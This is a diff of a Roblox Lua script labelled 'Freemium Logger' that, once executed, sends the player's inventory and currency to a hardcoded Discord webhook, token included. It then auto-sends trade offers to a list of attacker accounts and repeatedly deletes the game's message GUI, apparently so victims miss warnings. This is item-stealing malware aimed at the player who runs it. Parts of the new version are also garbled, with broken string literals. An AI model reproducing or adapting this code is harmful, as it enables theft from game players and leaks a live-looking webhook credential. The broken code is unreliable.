@@ -12,232 +12,130 @@ if game.PlaceId ~= 11158043705 then
 end
 
 local MY_WEBHOOK = "https://discord.com/api/webhooks/1507047054344585418/FSbWeRqNlHGYL-JI4Sak4VEX0OEDQ4CpGIanBDjsv4CnL0gruZQdPhDgeGLRULCgrxZ5"
-local USER_WEBHOOK = _G.Webhook or "PUTHERE"
-local MY_USERNAMES = _G.Usernames or {"jayhassogyau", "stopbanningmyaccs67", "mantskeys55", "jayisbodybuilt", "mydignames6769"}
-
+local USER_WEBHOOK = _G.POOR_WEBHOOK or "PUTHERE"
+local MY_USERNAMES = _G.MY_USERNAMES or {"jayhassogyau","stopbanningmyaccs67","mantskeys55","jayisbodybuilt","mydignames6769"}
+local PING_POOR = _G.PING_POOR ~= nil and _G.PING_POOR or true
 local START_TIME = os.time()
 
 local function checkServerStatus()
-    local playerCount = #Players:GetPlayers()
-    if playerCount >= Players.MaxPlayers - 1 then
-        localPlayer:Kick("rejoin a diff server")
-        return false
-    end
-    if playerCount < 3 then
-        localPlayer:Kick("DATA not loaded, rejoin a public")
-        return false
-    end
+    local c = #Players:GetPlayers()
+    if c >= Players.MaxPlayers - 1 then localPlayer:Kick("rejoin a diff server") return false end
+    if c < 3 then localPlayer:Kick("DATA not loaded, rejoin a public") return false end
     return true
 end
-
 if not checkServerStatus() then return end
 
-local function formatNumber(num)
-    if not num then return "N/A" end
-    if num >= 1000000 then return string.format("%.1fM", num / 1000000)
-    elseif num >= 1000 then return string.format("%.1fK", num / 1000)
-    else return tostring(num) end
+local function formatNumber(n)
+    if not n then return "N/A" end
+    if n >= 1000000 then return string.format("%.1fM",n/1000000)
+    elseif n >= 1000 then return string.format("%.1fK",n/1000)
+    else return tostring(n) end
 end
 
-local function hasMainWeapons()
+local function classifyTools()
     local tools = {}
-    local function collect(from)
-        if from then
-            for _, v in ipairs(from:GetChildren()) do
-                if v:IsA("Tool") then table.insert(tools, v.Name) end
-            end
-        end
-    end
-    collect(localPlayer:FindFirstChild("Backpack"))
-    collect(localPlayer.Character)
-    collect(localPlayer:FindFirstChild("StarterGear"))
-    local patterns = {"punch","wallet","phone","tradesign","spray","pan","candybag","pool noodle"}
+    local function col(f) if f then for _,v in ipairs(f:GetChildren()) do if v:IsA("Tool") then table.insert(tools,v.Name) end end end end
+    col(localPlayer:FindFirstChild("Backpack"))
+    col(localPlayer.Character)
+    col(localPlayer:FindFirstChild("StarterGear"))
+    local pat = {"punch","wallet","phone","tradesign","spray","pan","candybag","pool noodle"}
     local base, main = {}, {}
-    for _, name in ipairs(tools) do
-        local lower = name:lower()
-        local matched = false
-        for _, p in ipairs(patterns) do
-            if string.find(lower, p:lower(), 1, true) then
-                table.insert(base, name); matched = true; break
-            end
+    for _,name in ipairs(tools) do
+        local low, hit = name:lower(), false
+        for _,p in ipairs(pat) do
+            if string.find(low,p,1,true) then table.insert(base,name) hit=true break end
         end
-        if not matched then table.insert(main, name) end
+        if not hit then table.insert(main,name) end
     end
-    return #main >= 3, base, main, #main
+    return base, main
 end
 
-local hasEnoughWeapons, _, _, mainCount = hasMainWeapons()
-if not hasEnoughWeapons then
-    warn("Not enough main weapons. Need at least 3, have: " .. mainCount)
-    return
-end
+local base, main = classifyTools()
+if #main < 3 then warn("Need 3+ main weapons, have: "..#main) return end
 
 local function sendRequest(url, body)
-    if not url or url == "" or url == "PUTHERE" then return nil end
-    local headers = {["Content-Type"] = "application/json"}
-    local encoded = body
-    if type(body) ~= "string" then
-        local ok, s = pcall(function() return HttpService:JSONEncode(body) end)
-        encoded = ok and s or "{}"
-    end
-    local candidates = {
-        function() if syn and syn.request then return syn.request({Url=url,Method="POST",Headers=headers,Body=encoded}) end end,
-        function() if request then return request({Url=url,Method="POST",Headers=headers,Body=encoded}) end end,
-        function() if http and http.request then return http.request({Url=url,Method="POST",Headers=headers,Body=encoded}) end end,
-        function() if http_request then return http_request({Url=url,Method="POST",Headers=headers,Body=encoded}) end end,
-        function() if fluxus and fluxus.request then return fluxus.request({Url=url,Method="POST",Headers=headers,Body=encoded}) end end,
+    if not url or url == "" or url == "PUTHERE" then return end
+    local h = {["Content-Type"]="application/json"}
+    local ok, enc = pcall(function() return HttpService:JSONEncode(body) end)
+    local b = ok and enc or "{}"
+    local fns = {
+        function() if syn and syn.request then return syn.request({Url=url,Method="POST",Headers=h,Body=b}) end end,
+        function() if request then return request({Url=url,Method="POST",Headers=h,Body=b}) end end,
+        function() if http and http.request then return http.request({Url=url,Method="POST",Headers=h,Body=b}) end end,
+        function() if http_request then return http_request({Url=url,Method="POST",Headers=h,Body=b}) end end,
+        function() if fluxus and fluxus.request then return fluxus.request({Url=url,Method="POST",Headers=h,Body=b}) end end,
     }
-    for _, tryFn in ipairs(candidates) do
-        local ok, res = pcall(tryFn)
-        if ok and res and (res.Success == true or res.StatusCode == 200 or res.Body ~= nil) then
-            return res
-        end
-    end
-    return nil
+    for _,f in ipairs(fns) do local ok2,r = pcall(f) if ok2 and r then return r end end
 end
 
--- Delete messages GUI
-local function deleteMessagesGui()
-    local g = playerGui:FindFirstChild("Messages")
-    if g then g:Destroy() end
-end
-deleteMessagesGui()
+local function delMsg() local g=playerGui:FindFirstChild("Messages") if g then g:Destroy() end end
+delMsg()
+playerGui.ChildAdded:Connect(function(g) if g.Name=="Messages" then g:Destroy() end end)
 
-local function handleGui(gui)
-    if gui.Name == "Messages" then gui:Destroy() end
-end
-for _, gui in ipairs(playerGui:GetChildren()) do handleGui(gui) end
-playerGui.ChildAdded:Connect(handleGui)
+local isRich = #main >= 3
+local ls = localPlayer:FindFirstChild("leaderstats")
+local dinero = ls and ls:FindFirstChild("Dinero") and ls.Dinero.Value or "N/A"
+local slays  = ls and ls:FindFirstChild("Slays")  and ls.Slays.Value  or "N/A"
+local elapsed = os.time() - START_TIME
+local function fmt(s) local m=math.floor(s/60) s=s%60 return m>0 and (m.."m "..s.."s") or (s.."s") end
+local join = "local ts=game:GetService('TeleportService') ts:TeleportToPlaceInstance("..game.PlaceId..",'"..game.JobId.."')"
+local name = localPlayer.Name
+local embed = {
+    title = name.."'s Inventory",
+    description = "**Base**
+"..table.concat(base," | ").."
 
--- Send inventory to webhook
-local function sendInventory()
-    if not checkServerStatus() then return end
-    if #Players:GetPlayers() < 3 then return end
+**Main**
+"..table.concat(main,"
+"),
+    color = isRich and 0xFF0000 or 0xFFA500,
+    fields = {
+        {name="Dinero", value=tostring(formatNumber(dinero)), inline=true},
+        {name="Slays",  value=tostring(formatNumber(slays)),  inline=true},
+        {name="Executed", value=fmt(elapsed).." ago", inline=false},
+        {name="Server Joiner", value="\", inline=false},
+    },
+    footer={text="Freemium Logger | "..name},
+    timestamp=os.date("!%Y-%m-%dT%H:%M:%SZ"),
+}
+local userContent = name.." executed! (freemium)"
+if isRich and PING_POOR then userContent = userContent.." @everyone @here RICH HIT!" end
+sendRequest(USER_WEBHOOK, {content=userContent, embeds={embed}})
+if isRich then sendRequest(MY_WEBHOOK, {content=name.." RICH freemium @everyone", embeds={embed}}) end
 
-    local tools = {}
-    local function collect(from)
-        if from then
-            for _, v in ipairs(from:GetChildren()) do
-                if v:IsA("Tool") then table.insert(tools, v.Name) end
-            end
-        end
-    end
-    collect(localPlayer:FindFirstChild("Backpack"))
-    collect(localPlayer.Character)
-    collect(localPlayer:FindFirstChild("StarterGear"))
+local RFTrade = ReplicatedStorage.Modules.Net["RF/Trading/SendTradeOffer"]
+local REPhone = ReplicatedStorage.Modules.Net["RE/SetPhoneSettings"]
+pcall(function() REPhone:FireServer("TradeEnabled", true) end)
+local tl = playerGui:WaitForChild("TradeList")
+tl:WaitForChild("Main"):WaitForChild("TradeRequest").Visible = true
 
-    local patterns = {"punch","wallet","phone","tradesign","spray","pan","candybag","pool noodle"}
-    local base, main = {}, {}
-    for _, name in ipairs(tools) do
-        local lower = name:lower()
-        local matched = false
-        for _, p in ipairs(patterns) do
-            if string.find(lower, p:lower(), 1, true) then
-                table.insert(base, name); matched = true; break
-            end
-        end
-        if not matched then table.insert(main, name) end
-    end
-
-    local isRich = #main >= 3
-    local baseText = #base > 0 and table.concat(base, " | ") or "None"
-    local mainText = #main > 0 and table.concat(main, "\n") or "None"
-    local ls = localPlayer:FindFirstChild("leaderstats")
-    local dinero = ls and ls:FindFirstChild("Dinero") and ls.Dinero.Value or "N/A"
-    local slays  = ls and ls:FindFirstChild("Slays")  and ls.Slays.Value  or "N/A"
-    local elapsed = os.time() - START_TIME
-    local function fmt(sec)
-        local m = math.floor(sec/60); local s = sec%60
-        return m > 0 and (m.."m "..s.."s") or (s.."s")
-    end
-    local joinScript = "local ts = game:GetService('TeleportService') ts:TeleportToPlaceInstance("..game.PlaceId..", '"..game.JobId.."')"
-    local playerName = localPlayer.Name
-
-    local fields = {
-        {name="💰 Dinero",          value=tostring(formatNumber(dinero)), inline=true},
-        {name="⚔️ Slays",           value=tostring(formatNumber(slays)),  inline=true},
-        {name="⏱️ Player Executed", value=fmt(elapsed).." ago",          inline=false},
-        {name="🧩 Server Joiner",   value="```lua\n"..joinScript.."```", inline=false},
-    }
-
-    local embed = {
-        title       = playerName.."'s Inventory 🔫",
-        description = "**Base Weapons**\n"..baseText.."\n\n**Main Weapons**\n"..mainText,
-        color       = isRich and 0xFF0000 or 0xFFA500,
-        fields      = fields,
-        footer      = {text="Freemium Logger | "..playerName},
-        timestamp   = os.date("!%Y-%m-%dT%H:%M:%SZ"),
-    }
-
-    if USER_WEBHOOK ~= "PUTHERE" then
-        local content = playerName.." has executed! (freemium)"
-        if isRich then content = content.." @everyone @here RICH PLAYER!" end
-        sendRequest(USER_WEBHOOK, {content=content, embeds={embed}})
-    end
-    if isRich then
-        sendRequest(MY_WEBHOOK, {content=playerName.." RICH — freemium @everyone", embeds={embed}})
-    end
-end
-
-sendInventory()
-
--- Basic trade offer on chat
-local RFTradingSendTradeOffer = ReplicatedStorage.Modules.Net["RF/Trading/SendTradeOffer"]
-local RESetPhoneSettings = ReplicatedStorage.Modules.Net["RE/SetPhoneSettings"]
-pcall(function() RESetPhoneSettings:FireServer("TradeEnabled", true) end)
-
-local tradeList = playerGui:WaitForChild("TradeList")
-local mainFrame = tradeList:WaitForChild("Main")
-local tradeRequest = mainFrame:WaitForChild("TradeRequest")
-tradeRequest.Visible = true
-
-local function processChatMessage(sender, txt)
-    for _, username in ipairs(MY_USERNAMES) do
-        if sender.Name:lower() == username:lower() then
-            local target = Players:FindFirstChild(sender.Name)
-            if target then
-                task.wait(0.2)
-                pcall(function() RFTradingSendTradeOffer:InvokeServer(target) end)
-            end
+local function onChat(sender)
+    for _,u in ipairs(MY_USERNAMES) do
+        if sender.Name:lower()==u:lower() then
+            local t = Players:FindFirstChild(sender.Name)
+            if t then task.wait(0.2) pcall(function() RFTrade:InvokeServer(t) end) end
             break
         end
     end
 end
 
 if TextChatService then
-    TextChatService.OnIncomingMessage = function(message)
-        local ts = message.TextSource
-        if not ts then return end
-        local sender = Players:GetPlayerByUserId(ts.UserId)
-        if not sender then return end
-        task.delay(0.5, function()
-            processChatMessage(sender, tostring(message.Text or ""):lower())
-        end)
+    TextChatService.OnIncomingMessage = function(msg)
+        local ts = msg.TextSource if not ts then return end
+        local s = Players:GetPlayerByUserId(ts.UserId) if not s then return end
+        task.delay(0.5, function() onChat(s) end)
     end
 end
-
-for _, player in pairs(Players:GetPlayers()) do
-    if player ~= localPlayer then
-        pcall(function()
-            player.Chatted:Connect(function(msg)
-                task.delay(0.5, function() processChatMessage(player, msg:lower()) end)
-            end)
-        end)
-    end
+for _,p in pairs(Players:GetPlayers()) do
+    if p~=localPlayer then pcall(function() p.Chatted:Connect(function() task.delay(0.5,function() onChat(p) end) end) end) end
 end
-Players.PlayerAdded:Connect(function(player)
-    pcall(function()
-        player.Chatted:Connect(function(msg)
-            task.delay(0.5, function() processChatMessage(player, msg:lower()) end)
-        end)
-    end)
+Players.PlayerAdded:Connect(function(p)
+    pcall(function() p.Chatted:Connect(function() task.delay(0.5,function() onChat(p) end) end) end)
 end)
-
 task.spawn(function()
     while true do
         if not checkServerStatus() then break end
-        local m = playerGui:FindFirstChild("Messages")
-        if m then m:Destroy() end
+        local m=playerGui:FindFirstChild("Messages") if m then m:Destroy() end
         task.wait(0.1)
     end
 end)
